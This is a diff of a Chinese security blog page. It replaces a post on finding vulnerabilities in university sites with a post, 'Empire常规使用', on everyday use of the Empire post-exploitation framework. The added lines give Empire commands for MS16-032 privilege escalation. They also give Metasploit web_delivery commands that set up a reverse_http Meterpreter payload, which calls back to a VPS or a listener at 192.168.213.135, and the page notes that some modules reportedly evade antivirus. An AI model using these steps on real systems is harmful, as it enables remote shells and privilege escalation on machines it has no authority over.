+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">usemodule privesc&#x2F;ms16-032</span><br><span class="line">info，查看要进行设置的参数</span><br><span class="line">set Listener em，设置监听器</span><br><span class="line">execute，启动</span><br><span class="line">输入y</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/9.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
 
-<h1 id="挖掘通用"><a href="#挖掘通用" class="headerlink" title="挖掘通用"></a>挖掘通用</h1><p>1.通过信息收集得到该网站的源码，从而进行代码审计</p>
-<p>2.通过黑盒的方式进行挖掘</p>
-<p>3.审计大学常用CMS</p>
-<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>其他的话，跟平常的渗透无差别</p>
-<p><strong><u>禁止非法渗透，产生一切后果与作者无关</u></strong></p>
+<p>返回会话，才能算是提权成功</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/10.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>最后查看一下权限</p>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/11.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<h2 id="与MSF联动"><a href="#与MSF联动" class="headerlink" title="与MSF联动"></a>与MSF联动</h2><p>MSF</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/script/web_delivery</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br><span class="line">set target PSH</span><br><span class="line">set lhost VPSIP</span><br><span class="line">exploit</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/12.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<p>Empire</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">usemodule powershell&#x2F;code_execution&#x2F;invoke_metasploitpayload</span><br><span class="line">set Agent UE2ZX5HD</span><br><span class="line">set URL http:&#x2F;&#x2F;192.168.213.135:8080&#x2F;sKORwU</span><br><span class="line">execute</span><br></pre></td></tr></table></figure>
+<p><img class="lazyload lazyload-style-1" src="data:image/svg+xml;base64,PCEtLUFyZ29uTG9hZGluZy0tPgo8c3ZnIHdpZHRoPSIxIiBoZWlnaHQ9IjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgc3Ryb2tlPSIjZmZmZmZmMDAiPjxnPjwvZz4KPC9zdmc+"  data-original="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/13.png" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC"></p>
+
+<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>这个工具还有很多要进行学习的，有的模块听说直接免杀，有空得试试</p>
 
 	</div>
 
@@ -705,7 +702,7 @@
 	
 		<div class="post-tags">
 			<i class="fa fa-tags" aria-hidden="true"></i>
-			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag">渗透测试</a>
+			<a class="tag badge badge-secondary post-meta-detail-tag -none-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a>
 		</div>
 	
 </article>
@@ -747,7 +744,7 @@
 				<span class="btn-inner--icon"><i class="fa fa-twitter"></i></span>
 			</button>
 		</a>
-		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/&text=记EDUSEC挖掘方法" tooltip="分享到 Telegram">
+		<a target="_blank" class="no-pjax icon-telegram" href="https://telegram.me/share/url?url=http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/&text=Empire常规使用" tooltip="分享到 Telegram">
 			<button class="btn btn-icon btn-primary" style="background: #42a5f5;border: none;">
 				<span class="btn-inner--icon"><i class="fa fa-telegram"></i></span>
 			</button>
@@ -764,13 +761,11 @@
 </div>
 <script type="text/javascript">
 	socialShare("#share", {
-	    title : '记EDUSEC挖掘方法',
-	    description : '前言记录常规的挖掘方法，一般差别不大
-惭愧，在废物的路上越走越远
-谷歌语法批量刷信息泄露该语法范围比...',
+	    title : 'Empire常规使用',
+	    description : '前言Empire是一个PowerShell后期漏洞利用代理工具同时也是一款很强大的后渗透测神器，它建...',
 	    wechatQrcodeTitle : "分享到微信",
 	    wechatQrcodeHelper : '微信扫描二维码',
-	    source : 'http://example.com/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/'
+	    source : 'http://example.com/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/'
 	});
 	$("#share_show")[0].onclick = function(){
 		$("#share_container").addClass("opened");
@@ -834,7 +829,7 @@
 </div>
 
 
-<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"><span class="page-navigation-extra-text"><i class="fa fa-arrow-circle-o-left" aria-hidden="true"></i>上一篇</span><a href="/2021/03/18/Empire%E5%B8%B8%E8%A7%84%E4%BD%BF%E7%94%A8/" rel="prev"> Empire常规使用</a></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2021/01/25/kerberos%E6%B5%85%E6%9E%90%E8%AE%A4%E8%AF%81%E5%8F%8A%E6%94%BB%E5%87%BB%E6%96%B9%E6%B3%95/" rel="next"> kerberos浅析认证及攻击方法</a></div></div>
+<div class="post-navigation card shadow-sm"><div class="post-navigation-item post-navigation-pre"></div><div class="post-navigation-item post-navigation-next"><span class="page-navigation-extra-text">下一篇 <i class="fa fa-arrow-circle-o-right" aria-hidden="true"></i></span><a href="/2021/03/03/%E8%AE%B0EDUSEC%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95/" rel="next"> 记EDUSEC挖掘方法</a></div></div>
 
 
 
